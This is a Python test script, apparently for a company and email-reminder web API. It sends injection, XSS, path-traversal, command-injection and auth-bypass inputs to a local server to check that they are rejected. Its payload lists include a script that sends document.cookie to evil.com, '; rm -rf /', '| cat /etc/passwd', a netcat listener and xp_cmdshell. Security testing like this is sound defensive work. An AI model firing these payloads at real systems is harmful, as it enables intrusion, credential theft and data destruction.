"""
ATOMIC BOMB PROOF API TESTER
Tests every conceivable attack, validation, edge case, and error condition.
This is the most comprehensive API test suite you've ever seen.
"""

import asyncio
import json
import random
import string
import time
import uuid
from datetime import datetime, date, timedelta
from itertools import product, combinations
from typing import Any, Dict, List, Optional, Union
import base64
import hashlib
import urllib.parse

import httpx
import logging

# Configure detailed logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('atomic_test_results.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class AtomicBombTester:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip("/")
        self.api_url = f"{self.base_url}/api"
        self.client = httpx.AsyncClient(timeout=60.0)
        
        # Track everything we create for cleanup
        self.created_companies = []
        self.created_reminders = []
        
        # Test statistics
        self.stats = {
            "total_tests": 0,
            "passed": 0,
            "failed": 0,
            "security_tests": 0,
            "security_passed": 0,
            "vulnerability_found": 0,
            "edge_cases": 0,
            "edge_passed": 0
        }
        
        # Attack payloads
        self.attack_payloads = self._generate_attack_payloads()
        
    def _generate_attack_payloads(self) -> Dict[str, List[str]]:
        """Generate comprehensive attack payloads"""
        return {
            "sql_injection": [
                "'; DROP TABLE companies; --",
                "' OR '1'='1",
                "1' UNION SELECT null,null,null--",
                "'; INSERT INTO companies VALUES ('hacked'); --",
                "' OR 1=1#",
                "admin'--",
                "admin'/*",
                "' OR 1=1 LIMIT 1 --",
                "1'; DELETE FROM companies WHERE 1=1; --",
                "'; EXEC xp_cmdshell('dir'); --"
            ],
            "xss_payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "'-alert('XSS')-'",
                "<script>fetch('/api/companies').then(r=>r.json()).then(console.log)</script>",
                "<script>document.location='http://evil.com/'+document.cookie</script>",
                "<object data='javascript:alert(\"XSS\")'></object>",
                "<details open ontoggle=alert('XSS')>"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/var/www/../../etc/passwd",
                "C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            "ldap_injection": [
                "*)(uid=*",
                "*))%00",
                "admin)(&(password=*))",
                "*)|(mail=*",
                "*)|(cn=*"
            ],
            "nosql_injection": [
                "true, $where: '1 == 1'",
                ", $where: '1 == 1'",
                "$ne",
                "[$ne]",
                "'; return '' == '",
                "1; return true",
                "{'$ne': null}",
                "{'$regex': '.*'}"
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "&& dir",
                "; rm -rf /",
                "$(whoami)",
                "`id`",
                "; sleep 10",
                "| nc -l 4444",
                "&& ping google.com"
            ],
            "buffer_overflow": [
                "A" * 1000,
                "A" * 10000,
                "A" * 100000,
                "\x00" * 1000,
                "\xff" * 1000
            ],
            "format_string": [
                "%x%x%x%x",
                "%s%s%s%s",
                "%n%n%n%n",
                "%08x.%08x.%08x",
                "%p%p%p%p"
            ],
            "unicode_attacks": [
                "\u0000",
                "\ufeff",
                "\u202e",
                "\u200b",
                "А", # Cyrillic A
                "𝐀", # Mathematical Bold A
                "🔥💥🚀"
            ]
        }

    async def run_comprehensive_tests(self):
        """Run the most comprehensive test suite possible"""
        logger.info("🚀 STARTING ATOMIC BOMB PROOF API TESTING")
        logger.info("=" * 80)
        
        start_time = time.time()
        
        try:
            # 1. Basic Health Checks
            await self.test_health_endpoints()
            
            # 2. Company CRUD with ALL possible combinations
            await self.test_company_comprehensive()
            
            # 3. Security Attack Tests
            await self.test_security_attacks()
            
            # 4. Edge Case Testing
            await self.test_edge_cases()
            
            # 5. Email Endpoint Comprehensive Testing
            await self.test_email_comprehensive()
            
            # 6. Reminder Endpoint Comprehensive Testing
            await self.test_reminder_comprehensive()
            
            # 7. Performance and Load Testing
            await self.test_performance()
            
            # 8. Race Condition Testing
            await self.test_race_conditions()
            
            # 9. Authorization and Authentication Testing
            await self.test_auth_bypass()
            
            # 10. Input Validation Boundary Testing
            await self.test_boundary_conditions()
            
            # 11. Error Handling Testing
            await self.test_error_handling()
            
            # 12. Protocol-Level Attacks
            await self.test_protocol_attacks()
            
        finally:
            await self.cleanup_all()
            await self.client.aclose()
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.print_final_report(duration)

    async def test_health_endpoints(self):
        """Test basic health endpoints"""
        logger.info("🔍 Testing Health Endpoints")
        
        endpoints = [
            ("GET", "/", 200),
            ("GET", "/health", 200),
            ("GET", "/api/categories", 200),
            ("OPTIONS", "/", 200),
            ("HEAD", "/", 200),
        ]
        
        for method, endpoint, expected in endpoints:
            await self._test_endpoint(method, f"{self.base_url}{endpoint}", expected_status=expected)

    async def test_company_comprehensive(self):
        """Test every possible company creation scenario"""
        logger.info("🔍 Comprehensive Company Testing")
        
        # Valid company name variations
        valid_names = [
            "Test Company Ltd",
            "ACME Corporation",
            "Tech Solutions Inc",
            "Global Services Pvt Ltd",
            "Innovation Labs LLC",
            "Digital Dynamics Co",
            "Future Systems Corp",
            "Advanced Technologies Inc",
            "Smart Solutions Ltd",
            "Modern Enterprises Inc"
        ]
        
        # Valid email variations
        valid_emails = [
            "admin@company.com",
            "contact@business.org",
            "info@corporation.net",
            "support@enterprise.co.uk",
            "sales@startup.io",
            "accounts@firm.in",
            "hr@organization.com",
            "ceo@company.biz"
        ]
        
        # Test all combinations of 1-5 emails per company
        for name_idx, name in enumerate(valid_names):
            for email_count in range(1, 6):
                unique_name = f"{name} {uuid.uuid4().hex[:8]}"
                emails = [{"email": f"{email.split('@')[0]}_{uuid.uuid4().hex[:4]}@{email.split('@')[1]}"} 
                         for email in valid_emails[:email_count]]
                
                payload = {
                    "name": unique_name,
                    "client_emails": emails
                }
                
                result = await self._test_endpoint("POST", f"{self.api_url}/companies/", 
                                                 data=payload, expected_status=200)
                
                if result and result.get("success") and result.get("response"):
                    try:
                        company_data = json.loads(result["response"])
                        if company_data.get("id"):
                            self.created_companies.append(company_data["id"])
                    except:
                        pass

    async def test_security_attacks(self):
        """Test all security attack vectors"""
        logger.info("🔍 Security Attack Testing")
        
        for attack_type, payloads in self.attack_payloads.items():
            logger.info(f"Testing {attack_type.upper()} attacks")
            
            for payload in payloads:
                self.stats["security_tests"] += 1
                
                # Test in company name
                attack_data = {
                    "name": payload,
                    "client_emails": [{"email": "test@example.com"}]
                }
                
                result = await self._test_endpoint("POST", f"{self.api_url}/companies/", 
                                                 data=attack_data, expected_status=[400, 422])
                
                if result and result.get("success"):
                    self.stats["security_passed"] += 1
                else:
                    self.stats["vulnerability_found"] += 1
                    logger.warning(f"🚨 POTENTIAL VULNERABILITY: {attack_type} - {payload[:50]}...")
                
                # Test in email field
                attack_data = {
                    "name": f"Test Company {uuid.uuid4().hex[:8]}",
                    "client_emails": [{"email": payload}]
                }
                
                result = await self._test_endpoint("POST", f"{self.api_url}/companies/", 
                                                 data=attack_data, expected_status=[400, 422])
                
                if result and result.get("success"):
                    self.stats["security_passed"] += 1
                else:
                    self.stats["vulnerability_found"] += 1
                    logger.warning(f"🚨 POTENTIAL VULNERABILITY: {attack_type} in email - {payload[:50]}...")

    async def test_edge_cases(self):
        """Test edge cases and boundary conditions"""
        logger.info("🔍 Edge Case Testing")
        
        edge_cases = [
            # Empty and null values
            {"name": None, "client_emails": [{"email": "test@test.com"}]},
            {"name": "", "client_emails": [{"email": "test@test.com"}]},
            {"name": "Test Co", "client_emails": None},
            {"name": "Test Co", "client_emails": []},
            {"name": "Test Co", "client_emails": [{"email": None}]},
            {"name": "Test Co", "client_emails": [{"email": ""}]},
            
            # Unicode and special characters
            {"name": "🏢 Company 株式会社", "client_emails": [{"email": "test@münchen.de"}]},
            {"name": "Тест Компания", "client_emails": [{"email": "тест@тест.рф"}]},
            {"name": "公司测试", "client_emails": [{"email": "测试@测试.中国"}]},
            
            # Very long strings
            {"name": "A" * 255, "client_emails": [{"email": "test@test.com"}]},
            {"name": "A" * 1000, "client_emails": [{"email": "test@test.com"}]},
            {"name": "Test Co", "client_emails": [{"email": "a" * 250 + "@test.com"}]},
            
            # Special characters in names
            {"name": "Test & Co.", "client_emails": [{"email": "test@test.com"}]},
            {"name": "Test-Company_2024", "client_emails": [{"email": "test@test.com"}]},
            {"name": "Test (Global) Ltd", "client_emails": [{"email": "test@test.com"}]},
            {"name": "Test's Company", "client_emails": [{"email": "test@test.com"}]},
            {"name": 'Test "Quoted" Company', "client_emails": [{"email": "test@test.com"}]},
            
            # Email edge cases
            {"name": "Test Co", "client_emails": [{"email": "user@sub.domain.co.uk"}]},
            {"name": "Test Co", "client_emails": [{"email": "user+tag@domain.com"}]},
            {"name": "Test Co", "client_emails": [{"email": "user.name@domain.com"}]},
            {"name": "Test Co", "client_emails": [{"email": "123@domain.com"}]},
            
            # Multiple emails edge cases
            {"name": "Test Co", "client_emails": [{"email": "test@test.com"}] * 10},
            {"name": "Test Co", "client_emails": [{"email": f"test{i}@test.com"} for i in range(100)]},
            
            # Invalid JSON structures
            {"name": "Test Co", "client_emails": "not_a_list"},
            {"name": "Test Co", "client_emails": [{"not_email": "test@test.com"}]},
            {"name": 123, "client_emails": [{"email": "test@test.com"}]},
            {"name": ["Test Co"], "client_emails": [{"email": "test@test.com"}]},
        ]
        
        for case in edge_cases:
            self.stats["edge_cases"] += 1
            
            result = await self._test_endpoint("POST", f"{self.api_url}/companies/", 
                                             data=case, expected_status=[200, 400, 422])
            
            if result and result.get("success"):
                self.stats["edge_passed"] += 1

    async def test_email_comprehensive(self):
        """Test email endpoints comprehensively"""
        logger.info("🔍 Comprehensive Email Testing")
        
        # Test email listing with all possible parameters
        params_combinations = [
            {},
            {"limit": 10},
            {"limit": 100},
            {"offset": 0},
            {"offset": 50},
            {"company_id": 1},
            {"company_id": 999999},  # Non-existent
            {"company_id": -1},  # Invalid
            {"company_id": "invalid"},  # Wrong type
            {"primary_category": "GST"},
            {"primary_category": "TDS"},
            {"primary_category": "INVALID_CATEGORY"},
            {"data_month": 1},
            {"data_month": 12},
            {"data_month": 13},  # Invalid
            {"data_month": -1},  # Invalid
            {"data_year": 2024},
            {"data_year": 1999},  # Old year
            {"data_year": 2050},  # Future year
            {"is_processed": True},
            {"is_processed": False},
            {"is_processed": "invalid"},  # Wrong type
        ]
        
        for params in params_combinations:
            await self._test_endpoint("GET", f"{self.api_url}/emails/", 
                                    params=params, expected_status=[200, 422])
        
        # Test category summary
        await self._test_endpoint("GET", f"{self.api_url}/emails/categories/summary")
        
        # Test email classification endpoints
        await self._test_endpoint("POST", f"{self.api_url}/emails/classify-all")
        
        # Test individual email operations with various IDs
        test_ids = [1, 999999, -1, 0, "invalid", "' OR 1=1", "<script>"]
        for email_id in test_ids:
            await self._test_endpoint("GET", f"{self.api_url}/emails/{email_id}", 
                                    expected_status=[200, 404, 422])
            await self._test_endpoint("POST", f"{self.api_url}/emails/{email_id}/classify", 
                                    expected_status=[200, 404, 422])

    async def test_reminder_comprehensive(self):
        """Test reminder endpoints comprehensively"""
        logger.info("🔍 Comprehensive Reminder Testing")
        
        if not self.created_companies:
            logger.warning("No companies available for reminder testing")
            return
        
        # Test reminder creation with various data combinations
        reminder_test_cases = []
        
        for company_id in self.created_companies[:3]:  # Test with first 3 companies
            for month in range(1, 13):
                for year in [2023, 2024, 2025]:
                    for max_days in [1, 3, 5, 7, 10, 15, 30]:
                        reminder_test_cases.append({
                            "company_id": company_id,
                            "reminder_month": f"{year}-{month:02d}-01",
                            "max_days_to_send": max_days
                        })
        
        # Test first 50 combinations to avoid overwhelming
        for case in reminder_test_cases[:50]:
            result = await self._test_endpoint("POST", f"{self.api_url}/reminders/", 
                                             data=case, expected_status=[200, 400])
            
            if result and result.get("success") and result.get("response"):
                try:
                    reminder_data = json.loads(result["response"])
                    if reminder_data.get("id"):
                        self.created_reminders.append(reminder_data["id"])
                except:
                    pass
        
        # Test invalid reminder cases
        invalid_cases = [
            {"company_id": 999999, "reminder_month": "2024-01-01", "max_days_to_send": 5},
            {"company_id": self.created_companies[0], "reminder_month": "invalid-date", "max_days_to_send": 5},
            {"company_id": self.created_companies[0], "reminder_month": "2024-01-01", "max_days_to_send": -1},
            {"company_id": self.created_companies[0], "reminder_month": "2024-01-01", "max_days_to_send": 1000},
            {"company_id": "invalid", "reminder_month": "2024-01-01", "max_days_to_send": 5},
        ]
        
        for case in invalid_cases:
            await self._test_endpoint("POST", f"{self.api_url}/reminders/", 
                                    data=case, expected_status=[400, 422])

    async def test_performance(self):
        """Test performance under load"""
        logger.info("🔍 Performance Testing")
        
        # Concurrent requests test
        tasks = []
        for i in range(100):
            task = self._test_endpoint("GET", f"{self.api_url}/companies/")
            tasks.append(task)
        
        start_time = time.time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        end_time = time.time()
        
        successful = sum(1 for r in results if isinstance(r, dict) and r.get("success"))
        logger.info(f"Performance: {successful}/100 requests successful in {end_time-start_time:.2f}s")

    async def test_race_conditions(self):
        """Test for race conditions"""
        logger.info("🔍 Race Condition Testing")
        
        # Try to create the same company simultaneously
        company_data = {
            "name": f"Race Condition Test {uuid.uuid4().hex[:8]}",
            "client_emails": [{"email": "race@test.com"}]
        }
        
        tasks = [
            self._test_endpoint("POST", f"{self.api_url}/companies/", data=company_data)
            for _ in range(10)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        successful = sum(1 for r in results if isinstance(r, dict) and r.get("success"))
        
        if successful > 1:
            logger.warning(f"🚨 RACE CONDITION: {successful} simultaneous creates succeeded")
        else:
            logger.info("✅ Race condition protection working")

    async def test_auth_bypass(self):
        """Test authentication and authorization bypass attempts"""
        logger.info("🔍 Authentication Bypass Testing")
        
        # Test with various fake tokens
        fake_tokens = [
            "Bearer fake_token",
            "Bearer " + "A" * 1000,
            "Bearer null",
            "Bearer undefined",
            "Basic admin:admin",
            "Basic " + base64.b64encode(b"admin:admin").decode(),
        ]
        
        for token in fake_tokens:
            headers = {"Authorization": token}
            await self._test_endpoint("GET", f"{self.api_url}/companies/", 
                                    headers=headers, expected_status=[200, 401, 403])

    async def test_boundary_conditions(self):
        """Test boundary conditions for all numeric fields"""
        logger.info("🔍 Boundary Condition Testing")
        
        boundary_values = [
            -2147483648, -1, 0, 1, 2147483647, 2147483648,  # 32-bit int boundaries
            -9223372036854775808, 9223372036854775807, 9223372036854775808,  # 64-bit boundaries
        ]
        
        for value in boundary_values:
            # Test as company_id in various endpoints
            await self._test_endpoint("GET", f"{self.api_url}/companies/{value}", 
                                    expected_status=[200, 404, 422])
            
            # Test in query parameters
            await self._test_endpoint("GET", f"{self.api_url}/emails/", 
                                    params={"company_id": value}, expected_status=[200, 422])

    async def test_error_handling(self):
        """Test error handling robustness"""
        logger.info("🔍 Error Handling Testing")
        
        # Test malformed JSON
        malformed_payloads = [
            '{"name": "test"',  # Incomplete JSON
            '{"name": "test",}',  # Trailing comma
            '{"name": "test", "client_emails": [{"email": "test@test.com"}',  # Incomplete array
            '{name: "test"}',  # Unquoted keys
            '{"name": test}',  # Unquoted values
        ]
        
        for payload in malformed_payloads:
            response = await self.client.post(
                f"{self.api_url}/companies/",
                content=payload,
                headers={"Content-Type": "application/json"}
            )
            # Should return 422 for malformed JSON
            self.stats["total_tests"] += 1
            if response.status_code == 422:
                self.stats["passed"] += 1

    async def test_protocol_attacks(self):
        """Test protocol-level attacks"""
        logger.info("🔍 Protocol Attack Testing")
        
        # HTTP method override attempts
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
        
        for method in methods:
            await self._test_endpoint(method, f"{self.api_url}/companies/", 
                                    expected_status=[200, 405, 404])
        
        # Header injection attempts
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "Host": "evil.com",
            "User-Agent": "<script>alert('XSS')</script>",
            "Referer": "javascript:alert('XSS')",
        }
        
        for header, value in malicious_headers.items():
            await self._test_endpoint("GET", f"{self.api_url}/companies/", 
                                    headers={header: value})

    async def _test_endpoint(self, method: str, url: str, data: Optional[Dict] = None, 
                           params: Optional[Dict] = None, headers: Optional[Dict] = None,
                           expected_status: Union[int, List[int]] = 200) -> Optional[Dict]:
        """Test individual endpoint"""
        self.stats["total_tests"] += 1
        
        try:
            if isinstance(expected_status, int):
                expected_status = [expected_status]
            
            response = await self.client.request(
                method, url, json=data, params=params, headers=headers
            )
            
            success = response.status_code in expected_status
            
            if success:
                self.stats["passed"] += 1
            else:
                self.stats["failed"] += 1
                logger.warning(f"❌ {method} {url} - Expected {expected_status}, Got {response.status_code}")
            
            return {
                "success": success,
                "status_code": response.status_code,
                "response": response.text
            }
            
        except Exception as e:
            self.stats["failed"] += 1
            logger.error(f"🔥 {method} {url} - Exception: {e}")
            return None

    async def cleanup_all(self):
        """Clean up all created resources"""
        logger.info("🧹 Cleaning up test data...")
        
        # Clean up reminders
        for reminder_id in self.created_reminders:
            try:
                await self.client.delete(f"{self.api_url}/reminders/{reminder_id}")
            except:
                pass
        
        # Clean up companies
        for company_id in self.created_companies:
            try:
                await self.client.delete(f"{self.api_url}/companies/{company_id}")
            except:
                pass

    def print_final_report(self, duration: float):
        """Print comprehensive test report"""
        logger.info("\n" + "="*80)
        logger.info("🎯 ATOMIC BOMB PROOF API TEST RESULTS")
        logger.info("="*80)
        logger.info(f"⏱️  Total Duration: {duration:.2f} seconds")
        logger.info(f"📊 Total Tests: {self.stats['total_tests']}")
        logger.info(f"✅ Passed: {self.stats['passed']}")
        logger.info(f"❌ Failed: {self.stats['failed']}")
        logger.info(f"📈 Success Rate: {(self.stats['passed']/self.stats['total_tests']*100):.2f}%")
        logger.info(f"🔒 Security Tests: {self.stats['security_tests']}")
        logger.info(f"🛡️  Security Passed: {self.stats['security_passed']}")
        logger.info(f"🚨 Vulnerabilities Found: {self.stats['vulnerability_found']}")
        logger.info(f"⚡ Edge Cases Tested: {self.stats['edge_cases']}")
        logger.info(f"✨ Edge Cases Passed: {self.stats['edge_passed']}")
        logger.info("="*80)
        
        if self.stats['vulnerability_found'] > 0:
            logger.error("🚨 SECURITY VULNERABILITIES DETECTED!")
            logger.error("Check the logs above for details on potential security issues.")
        else:
            logger.info("🛡️  NO SECURITY VULNERABILITIES FOUND!")
        
        if self.stats['passed'] == self.stats['total_tests']:
            logger.info("🎉 ALL TESTS PASSED! Your API is ATOMIC BOMB PROOF!")
        else:
            logger.warning(f"⚠️  {self.stats['failed']} tests failed. Review the failures above.")

async def main():
    """Run the atomic bomb proof tester"""
    tester = AtomicBombTester()
    await tester.run_comprehensive_tests()

if __name__ == "__main__":
    logger.info("🔥 ATOMIC BOMB PROOF API TESTER")
    logger.info("Testing EVERYTHING possible on your API...")
    logger.info("This will take a while. Go get some coffee ☕")
    
    asyncio.run(main())
